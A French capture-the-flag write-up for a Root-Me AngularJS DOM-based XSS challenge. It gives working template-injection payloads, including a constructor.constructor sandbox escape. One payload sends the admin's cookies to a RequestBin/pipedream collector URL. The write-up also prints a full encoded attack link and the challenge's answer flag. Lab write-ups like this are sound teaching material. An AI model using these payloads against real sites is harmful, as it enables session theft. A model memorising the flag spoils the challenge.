## Challenges

### Web Client

### Challenge: XSS DOM Based - AngularJS

#### Problème

Ce défi consiste à trouver le flag existant dans les cookies de l’administrateur.

#### Première étape :

La première étape était d'identifier la vulnérabilité, qui était une XSS (cross-site scripting) dans Angular JS. Pour tester cette faille, on injecte de code Angular JS dans le champ nom du formulaire de Main.

#### Deuxième étape :

Dans cette étape, notre objectif était de récupérer le Cookie de l’administrateur du site. Pour cela, nous avons construit une XSS avec un payload de Cookie.

#### Troisième étape :

En se renseignant et en faisant quelques tests, nous pouvons voir que ce payload nous retourne bien le résultat 49 :

```JS
{{7*7}}
```

Après quelques recherches, on remarque un payload fonctionnant :

```JS
{{constructor.constructor("alert(1)")()}}
```

Il faudra cependant remplacer les simple quote ' par des doubles quotes " pour que le payload soit fonctionnel.

Ensuite nous pouvons constuire le payload final

```JS
document.location.href='https://requestb.in/xxxxx?cookie='+document.cookie
```

Dans la console :

```JS
constructor.constructor("document.location.href=`https://requestb.in/xxxxx?cookie=${document.cookie}`")()
```

Payload final :

```JS
{{constructor.constructor("document.location.href=`https://requestb.in/xxxxx?cookie=${document.cookie}`")()}}
```

la redirection s’effectue sans soucis maintenant dans la page contact nous pouvons envoyer notre payload encodé avec https://www.urlencoderorg/ et en envoyant l’URL dans le sujet contact afin que l’administrateur clique dessus et qu’on puisse récupérer le flag !

http://challenge01.root-me.org/web-client/ch35/index.php?name=%7B%7Bconstructor.constructor%28%22document.location.href%20%3D%20%60https%3A%2F%2Feonm7ebndig3cr2.m.pipedream.net%2F%3Fcookie%3D%24%7Bdocument.cookie%7D%60%22%29%28%29%7D%7D


Plus qu’à attendre quelques minutes, et nous obtenons le flag dans notre RequestBin!

**Explication :**

- `{{constructor.constructor("alert(1)")()}}` : La fonction `constructor` est une fonction existante en AngularJS qui existe dans tous les composants AngularJS. En utilisant `constructor.constructor`, on peut accéder à la fonction `Function` qui permet de créer une fonction. En utilisant `Function`, on peut exécuter du code JavaScript. Ici, on exécute `alert(1)`.
- `document.location.href='https://requestb.in/xxxxx?cookie='+document.cookie` : On redirige la page vers un site tiers avec le cookie de l'utilisateur. Cela permet de récupérer le cookie de l'utilisateur.
- On combine les deux pour exécuter du code JavaScript et rediriger la page vers un site tiers avec le cookie de l'utilisateur.

#### Solution
Le cookie pour validation est donc : `rootme{@NGu1@R_J$_1$_C001}`

